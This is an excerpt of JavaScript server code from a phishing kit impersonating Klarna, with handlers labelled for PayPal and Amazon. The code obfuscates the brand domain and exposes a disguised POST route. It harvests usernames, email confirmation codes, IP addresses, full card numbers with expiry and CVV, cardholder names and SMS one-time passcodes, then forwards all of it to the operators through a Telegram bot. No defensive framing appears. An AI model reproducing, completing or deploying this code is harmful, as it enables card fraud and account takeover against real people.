...
let target = "K-1l-1a-1r-1n-1a-1.-1d-1e"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "K-1l-1a-1r-1n-1a-1.-1d-1e"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");
...
app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
  ...
  try {
        if (process.env.CHATID && process.env.TOKEN) {
          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [Confirm-Email] (Klarna) | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nconfirm-code: ${data.code}\nIP: ${clientIp}\n\n-----> KEY-Sender: ${keyId}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
...
function a2(data, ip,keyId) {
  const content = `CARD N*: ${data.cardNumber}\nMM/YY: ${data.expiryDate}\nCVV: ${data.cvv}\nCARD NAME: ${data.cardName}`;
  sendTelegramNotification('[CC-s5ona]', content, ip,keyId);
}


// SMS notification function (first code) PayPal
function b3(data, ip,keyId) {
  sendTelegramNotification('[SMS]{PayPal}(1)', `OTP: ${data.code}`, ip,keyId);
}

// SMS notification function (first code)
function a3(data, ip,keyId) {
  sendTelegramNotification('[SMS]{Amazon}(1)', `OTP: ${data.code}`, ip,keyId);
}

// SMS notification function (second code)
function a4(data, ip,keyId) {
  sendTelegramNotification('[SMS]{Amazon}(2)', `OTP: ${data.code}`, ip,keyId);
}
